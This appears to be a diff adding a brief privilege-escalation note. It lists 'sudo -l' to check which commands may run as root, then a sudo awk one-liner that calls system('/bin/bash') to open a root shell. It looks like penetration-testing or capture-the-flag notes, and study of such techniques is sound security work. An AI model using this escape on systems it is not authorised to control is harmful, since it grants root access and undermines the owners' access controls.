@@ -1,0 +1,8 @@
+
+1) get the sudo available configuration check who can be launch as root
+
+sudo -l
+
+2) AWK process
+
+sudo awk 'BEGIN {system("/bin/bash")}'
